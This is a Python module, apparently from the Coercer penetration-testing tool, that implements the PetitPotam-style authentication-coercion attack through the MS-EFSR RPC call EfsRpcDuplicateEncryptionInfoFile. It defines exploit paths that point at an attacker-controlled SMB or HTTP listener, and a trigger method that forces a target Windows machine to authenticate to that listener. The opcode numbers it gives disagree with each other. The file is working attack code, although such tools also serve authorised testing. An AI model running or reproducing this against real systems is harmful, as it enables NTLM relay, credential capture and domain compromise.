#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : EfsRpcDuplicateEncryptionInfoFile.py
# Author             : Podalirius (@podalirius_)
# Date created       : 16 Sep 2022


from impacket.dcerpc.v5.dtypes import BOOL, DWORD, PCHAR, WSTR
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT

from coercer.models.MSPROTOCOLRPCCALL import MSPROTOCOLRPCCALL


class EFS_RPC_BLOB(NDRSTRUCT):
    structure = (
        ("Data", DWORD),
        ("cbData", PCHAR),
    )


class _EfsRpcDuplicateEncryptionInfoFile(NDRCALL):
    """
    Structure to make the RPC call to EfsRpcDuplicateEncryptionInfoFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)
    """

    opnum = 13
    structure = (
        ("SrcFileName", WSTR),  # Type: wchar_t *
        ("DestFileName", WSTR),  # Type: wchar_t *
        ("dwCreationDisposition", DWORD),  # Type: DWORD
        ("dwAttributes", DWORD),  # Type: DWORD
        ("RelativeSD", EFS_RPC_BLOB),  # Type: EFS_RPC_BLOB *
        ("bInheritHandle", BOOL),  # Type: BOOL
    )


class _EfsRpcDuplicateEncryptionInfoFileResponse(NDRCALL):
    """
    Structure to parse the response of the RPC call to EfsRpcDuplicateEncryptionInfoFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)
    """

    structure = ()


class EfsRpcDuplicateEncryptionInfoFile(MSPROTOCOLRPCCALL):
    """
    Coercing a machine to authenticate using function EfsRpcDuplicateEncryptionInfoFile (opnum 5) of [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)

    Method found by:
     - [@topotam77](https://twitter.com/topotam77)
    """

    exploit_paths = [
        ("smb", "\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00"),
        ("smb", "\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00"),
        ("smb", "\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00"),
        (
            "http",
            "\\\\{{listener}}{{http_listen_port}}/{{rnd(3)}}\\share\\file.txt\x00",
        ),
    ]

    access = {
        "ncan_np": [
            {
                "namedpipe": r"\PIPE\efsrpc",
                "uuid": "df1941c5-fe89-4e79-bf10-463657acf44d",
                "version": "1.0",
            },
            {
                "namedpipe": r"\PIPE\lsarpc",
                "uuid": "c681d488-d850-11d0-8c52-00c04fd90f7e",
                "version": "1.0",
            },
            {
                "namedpipe": r"\PIPE\samr",
                "uuid": "c681d488-d850-11d0-8c52-00c04fd90f7e",
                "version": "1.0",
            },
            {
                "namedpipe": r"\PIPE\lsass",
                "uuid": "c681d488-d850-11d0-8c52-00c04fd90f7e",
                "version": "1.0",
            },
            {
                "namedpipe": r"\PIPE\netlogon",
                "uuid": "c681d488-d850-11d0-8c52-00c04fd90f7e",
                "version": "1.0",
            },
        ],
        "ncacn_ip_tcp": [
            {"uuid": "df1941c5-fe89-4e79-bf10-463657acf44d", "version": "1.0"},
            {"uuid": "c681d488-d850-11d0-8c52-00c04fd90f7e", "version": "1.0"},
        ],
    }

    protocol = {
        "longname": "[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol",
        "shortname": "MS-EFSR",
    }

    function = {
        "name": "EfsRpcDuplicateEncryptionInfoFile",
        "opnum": 12,
        "vulnerable_arguments": ["SrcFileName"],
    }

    def trigger(self, dcerpc_session, target):
        if dcerpc_session is not None:
            try:
                request = _EfsRpcDuplicateEncryptionInfoFile()
                request["SrcFileName"] = self.path
                request["DestFileName"] = self.path
                request["dwCreationDisposition"] = 0
                request["dwAttributes"] = 0
                request["RelativeSD"] = EFS_RPC_BLOB()
                request["bInheritHandle"] = 0
                dcerpc_session.request(request)
                return ""
            except Exception as err:
                return err
        else:
            from coercer.core.Reporter import reporter

            reporter.print_error("Error: dce is None, you must call connect() first.")
            return None
